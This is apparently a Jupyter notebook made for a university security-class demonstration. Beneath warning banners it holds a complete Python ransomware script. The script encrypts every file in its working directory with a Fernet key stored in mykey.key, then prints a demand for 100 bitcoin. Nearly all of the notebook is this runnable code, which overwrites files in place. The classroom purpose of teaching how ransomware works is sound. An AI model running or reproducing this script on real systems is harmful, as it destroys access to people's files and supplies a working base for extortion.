{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h2>WARNING: THIS CODE IS FOR CLASS DEMO. DO-NOT-USE-FOR-OTHER-PURPOSE!</h2>\n",
    "<h3>File Encryption</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "##### !!! WARNING !!! ### !!! WARNING !!! ### !!! WARNING !!! ######\n",
    "##### This program encrypt all the files in the same directory. \n",
    "##### Be careful to use, and never use this to others system without permission\n",
    "##### Edited by Sangmork Park for Security Class Demo (Carolina University)\n",
    "\n",
    "#!/usr/bin/env python3\n",
    "\n",
    "import os\n",
    "from cryptography.fernet import Fernet\n",
    "\n",
    "##### Collect all file names in the directory and save it to files[]\n",
    "files = []\n",
    "for filename in os.listdir():\n",
    "    if filename == \"encrypt.py\" or filename == \"decrypt.py\" or filename == \"mykey.key\":\n",
    "        continue\n",
    "\n",
    "    if os.path.isfile(filename):\n",
    "        files.append(filename)\n",
    "# print(files)\n",
    "\n",
    "##### Create a symmetric key and store it to mykey.key\n",
    "key = Fernet.generate_key()\n",
    "with open(\"mykey.key\", \"wb\") as mykey:\n",
    "    mykey.write(key)\n",
    "\n",
    "##### Read contents of each file -> encrypt -> store it to the file\n",
    "for file in files:\n",
    "    with open(file, \"rb\") as thefile:\n",
    "        contents = thefile.read()\n",
    "    encrypted = Fernet(key).encrypt(contents)\n",
    "    # print(encrypted)\n",
    "\n",
    "    with open(file, \"wb\") as thefile:\n",
    "        thefile.write(encrypted)\n",
    "\n",
    "print(files)\n",
    "print(\"Dear, all files in this directory (listed above) are Encrypted!\")\n",
    "print(\"If you want to decrypt files, pay me in 100 BITCOIN.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "826bbc0456aa5c9ad77f7d90256c442d489e70b4f04d159d205e9b6d80c05621"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
